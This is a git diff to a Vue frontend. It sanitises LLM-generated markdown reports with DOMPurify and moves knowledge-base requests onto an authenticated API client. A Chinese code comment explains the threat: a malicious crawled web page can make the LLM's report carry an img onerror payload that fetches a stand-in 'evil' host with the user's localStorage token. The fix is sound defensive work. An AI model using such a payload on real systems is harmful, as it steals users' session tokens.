@@ -143,6 +143,7 @@ import { useRouter } from 'vue-router'
 import { useAuthStore } from '../stores/auth'
 import api from '../utils/api'
 import { marked } from 'marked'
+import DOMPurify from 'dompurify'
 
 const router = useRouter()
 const auth = useAuthStore()
@@ -380,7 +381,11 @@ async function start() {
 
 function renderMarkdown(text) {
   if (!text) return ''
-  return marked(text)
+  // 必须净化：报告由 LLM 基于「抓取到的任意网页」生成，再经 v-html 原样插入 DOM。
+  // 恶意网页只要让报告里出现 <img src=x onerror="fetch('//evil/'+localStorage.token)">，
+  // 渲染时就会执行并偷走 JWT。marked 只做 Markdown → HTML 转换，不做任何净化。
+  // nginx 那边的 CSP（script-src 'self'）是第二道闸，两层都需要。
+  return DOMPurify.sanitize(marked(text))
 }
 
 function scrollDown() {
@@ -486,7 +491,7 @@ const kbMsg = ref('')
 const selectedDocs = ref([])  // 勾选的文档 ID
 
 async function loadKB() {
-  try { const data = await fetch(`/kb/files?user_id=${auth.kbUserId()}`).then(r => r.json()); kbFiles.value = data.files || [] } catch (e) {}
+  try { const { data } = await api.get('/kb/files'); kbFiles.value = data.files || [] } catch (e) {}
 }
 
 async function uploadFile() {
@@ -495,16 +500,19 @@ async function uploadFile() {
   kbMsg.value = '上传中...'
   const form = new FormData(); form.append('file', file)
   try {
-    const resp = await fetch(`/kb/upload?user_id=${auth.kbUserId()}`, { method: 'POST', body: form })
-    const data = await resp.json()
+    // 走 api（axios）而不是裸 fetch：api 的请求拦截器会带上 JWT，
+    // 而 user_id 已改由网关从 JWT 解析 —— 前端不再传，也传不了。
+    const { data } = await api.post('/kb/upload', form)
     kbMsg.value = data.status === 'ok' ? `已上传：${data.doc_id}` : `失败：${data.message || '未知错误'}`
     if (data.status === 'ok') { fileInput.value.value = ''; loadKB() }
-  } catch (e) { kbMsg.value = '失败：' + e.message }
+  } catch (e) {
+    kbMsg.value = '失败：' + (e.response?.data?.message || e.message)
+  }
 }
 
 async function deleteFile(docId) {
   if (!confirm(`删除 ${docId}？`)) return
-  await fetch(`/kb/files/${docId}?user_id=${auth.kbUserId()}`, { method: 'DELETE' })
+  try { await api.delete(`/kb/files/${encodeURIComponent(docId)}`) } catch (e) {}
   selectedDocs.value = selectedDocs.value.filter(id => id !== docId)
   loadKB()
 }
